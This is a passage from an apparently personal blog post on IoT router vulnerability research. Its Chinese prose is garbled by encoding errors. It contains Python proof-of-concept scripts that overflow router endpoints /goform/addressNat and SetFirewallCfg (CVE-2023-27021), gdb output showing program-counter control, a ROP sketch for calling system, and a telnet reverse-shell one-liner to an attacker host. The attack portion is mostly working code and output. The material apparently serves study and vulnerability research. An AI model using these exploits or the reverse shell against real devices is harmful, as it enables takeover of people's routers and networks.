</span></span><span style="display:flex;"><span>ll <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">lambda</span> x : <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x1b</span><span style="color:#f1fa8c">[01;38;5;1m&#39;</span> <span style="color:#ff79c6">+</span> x <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x1b</span><span style="color:#f1fa8c">[0m&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;192.168.85.131&#39;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">80</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#ff79c6">=</span> socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET, socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>li(<span style="color:#f1fa8c">&#39;[+] connecting&#39;</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#ff79c6">.</span>connect((ip, port))
</span></span><span style="display:flex;"><span>li(<span style="color:#f1fa8c">&#39;[+] connect finish&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rn <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1 <span style="color:#ff79c6">=</span> cyclic(<span style="color:#bd93f9">0x300</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p2 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;page=&#39;</span> <span style="color:#ff79c6">+</span> p1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;POST /goform/addressNat&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34; HTTP/1.1&#34;</span> <span style="color:#ff79c6">+</span> rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Host: 192.168.0.1&#34;</span> <span style="color:#ff79c6">+</span> rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0&#34;</span> <span style="color:#ff79c6">+</span> rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span> <span style="color:#ff79c6">+</span> rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Accept-Language: en-US,en;q=0.5&#34;</span> <span style="color:#ff79c6">+</span> rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Accept-Encoding: gzip, deflate&#34;</span> <span style="color:#ff79c6">+</span> rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Cookie: password=hamster&#34;</span> <span style="color:#ff79c6">+</span> rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Connection: close&#34;</span> <span style="color:#ff79c6">+</span> rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Upgrade-Insecure-Requests: 1&#34;</span> <span style="color:#ff79c6">+</span> rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> (<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Content-Length: </span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> <span style="color:#8be9fd;font-style:italic">len</span>(p2)) <span style="color:#ff79c6">+</span>rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span><span style="color:#ff79c6">+</span>rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> rn
</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> p2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>li(<span style="color:#f1fa8c">&#39;[+] sendling payload&#39;</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#ff79c6">.</span>send(p3)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> r<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">4096</span>)
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> response<span style="color:#ff79c6">.</span>decode()
</span></span><span style="display:flex;"><span>li(response)
</span></span></code></pre></div><p>åŠ¨æ€è°ƒè¯•</p>
<p>qemuå¼€å¯gdbserver</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo qemu-arm-static -g <span style="color:#bd93f9">1234</span> -L ./ ./bin/httpd
</span></span></code></pre></div><p>gdb attach</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb-mulitarch
</span></span><span style="display:flex;"><span>$ file bin/httpd
</span></span><span style="display:flex;"><span>$ b *0x00079F64
</span></span></code></pre></div><p>å‘é€PoCï¼Œè°ƒè¯•åˆ°æ¼æ´å‡ºç°çš„åœ°æ–¹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> â–º 0x7a064 &lt;fromAddressNat+256&gt;    bl     <span style="color:#6272a4">#sprintf@plt                       &lt;sprintf@plt&gt;</span>
</span></span><span style="display:flex;"><span>        s: 0x4080010c â—‚â€” 0x0
</span></span><span style="display:flex;"><span>        format: 0xe6054 â—‚â€” <span style="color:#f1fa8c">&#39;advance/addressNatList.asp?page=%s&#39;</span>
</span></span><span style="display:flex;"><span>        vararg: 0x125250 â—‚â€” 0x61616161 <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;aaaa&#39;</span><span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>åœ¨å‡½æ•°è¿”å›æ—¶ï¼Œå°†pcèµ‹å€¼</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> â–º 0x7a0c8 &lt;fromAddressNat+356&gt;    sub    sp, fp, <span style="color:#6272a4">#8</span>
</span></span><span style="display:flex;"><span>   0x7a0cc &lt;fromAddressNat+360&gt;    pop    <span style="color:#ff79c6">{</span>r4, fp, pc<span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// ...
</span></span><span style="display:flex;"><span>Invalid address 0x61616160
</span></span></code></pre></div><h3 id="cve-2023-27021">CVE-2023-27021</h3>
<p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/13506?time__1311=mqmxnQiQi%3DDQ0%3DGODlcIEHfh%2BfhfrD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-5">è·¯ç”±å™¨é€šç”¨0dayæ¼æ´æŒ–æ˜åŠRCEæ€è·¯</a></p>
<p>ç›¸åŒçš„å›ºä»¶ï¼Œå‡½æ•°æ˜¯ <code>formSetFirewallCfg</code></p>
<p>PoC</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://192.168.85.131/goform/SetFirewallCfg&#34;</span>
</span></span><span style="display:flex;"><span>header <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Content-Type&#34;</span>: <span style="color:#f1fa8c">&#34;application/x-www-form-urlencoded; charset=UTF-8&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Cookie&#34;</span>: <span style="color:#f1fa8c">&#34;password=hamster&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;A&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">500</span>
</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;firewallEn&#34;</span>: payload}
</span></span><span style="display:flex;"><span>resp <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, headers<span style="color:#ff79c6">=</span>header, data<span style="color:#ff79c6">=</span>data, timeout<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5</span>)
</span></span><span style="display:flex;"><span>resp <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, headers<span style="color:#ff79c6">=</span>header, data<span style="color:#ff79c6">=</span>data, timeout<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(resp<span style="color:#ff79c6">.</span>text)
</span></span></code></pre></div><p>è¿™ä¸¤ä¸ªæ¼æ´éƒ½æ˜¯å¯ä»¥æ§åˆ¶å‡½æ•°æ‰§è¡Œæµçš„ï¼Œå› æ­¤éœ€è¦å­¦ä¹ ä¸€ä¸‹ROPæ˜¯å¦‚ä½•å†™</p>
<ul>
<li>libcbase: åœ¨gdbé‡Œé¢vmmapä¸€ä¸‹</li>
<li>ROP: éœ€è¦çŸ¥é“å„ä¸ªå¯„å­˜å™¨çš„ä½œç”¨</li>
<li>è·¯ç”±å™¨ä¸€èˆ¬ä¸æ”¯æŒbin/bashå‘½ä»¤ï¼Œé€‰æ‹©ç”¨telnetæ¥getshell</li>
</ul>
<p>å¯ä»¥ä½¿ç”¨pop pc æ¥æ§åˆ¶å‡½æ•°æ‰§è¡Œæµ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#50fa7b">pop</span> {r3, pc}
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">r3_val:</span> <span style="color:#50fa7b">system_addr</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">pc:</span> å°†åœ°å€æ”¹æˆä¸‹é¢æŒ‡ä»¤åœ°å€
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">mov</span> r0, sp <span style="color:#6272a4">// r0ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">blx</span>, r3
</span></span></code></pre></div><p>telnet åå¼¹shell</p>
<ul>
<li>telnetåœ¨æ”»å‡»è€…ä¸»æœºx.x.x.xåŠport1å¼€å¯ç›‘å¬ç”¨æˆ·ï¼Œå¹¶å°†æ­¤å¤„Telnetçš„æ ‡å‡†è¾“å…¥é€šè¿‡ç®¡é“ç¬¦ä¼ ç»™åé¢å‘½ä»¤<code>/bin/bash</code>æ‰§è¡Œï¼Œå†å°†<code>/bin/bash</code>çš„è¾“å‡ºç»“æœä½œä¸ºåé¢<code>telnet</code>çš„è¾“å…¥ã€‚æ­¤æ—¶é€šè¿‡ä¸¤ä¸ªç«¯å£ï¼Œä¸€ä¸ªæ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œé€šè¿‡<code>/bin/bash</code>å¤„ç†åå†ç”±å¦ä¸€ä¸ªç«¯å£è¾“å‡ºã€‚</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># (x.x.x.xä¸ºæ”»å‡»æœºip)</span>
</span></span><span style="display:flex;"><span>$ telnet x.x.x.x <span style="color:#bd93f9">6666</span> | /bin/bash | telnet x.x.x.x <span style="color:#bd93f9">5555</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># æˆ‘ä»¬ç›‘å¬5555ç«¯å£</span>
</span></span></code></pre></div><h2 id="more">more</h2>
<p>IDAæ¼æ´æ‰«ææ’ä»¶ï¼š<a href="https://github.com/Accenture/VulFi">VulFi: IDA Pro plugin for query based searching within the binary useful mainly for vulnerability research</a></p>
<p>å·¥å…·å®‰è£…ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/Accenture/VulFi
</span></span></code></pre></div><p>ç„¶åå°†æŸäº›æ–‡ä»¶å…¶æ”¾åœ¨ida/pluginsç›®å½•ä¸‹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cp vulfi.py vulfi_prototypes.json vulfi_rules.json ~/~/idafree-8.4/plugins
</span></span></code></pre></div><p>åœ¨searchæ å°±èƒ½æ‰¾åˆ° <code>VulFi</code> å›¾æ ‡</p>
<p>å†™è‡ªå·±çš„è§„åˆ™ï¼šå°†alt_names æ”¹æˆè‡ªå·±çš„åˆ—è¡¨å°±è¡Œï¼Œå¯ä»¥å‚è€ƒé»˜è®¤çš„ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;name&#34;</span>: <span style="color:#f1fa8c">&#34;RULE NAME&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;alt_names&#34;</span>:[
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;function_name_to_look_for&#34;</span>
</span></span><span style="display:flex;"><span>        ],
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;wrappers&#34;</span>:<span style="color:#ff79c6">true</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;mark_if&#34;</span>:{
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;High&#34;</span>:<span style="color:#f1fa8c">&#34;True&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;Medium&#34;</span>:<span style="color:#f1fa8c">&#34;False&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;Low&#34;</span>: <span style="color:#f1fa8c">&#34;False&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/iot">IoT</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        var disqus_shortname = 'ldrx30';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>

</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  Â© ldrx30 |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
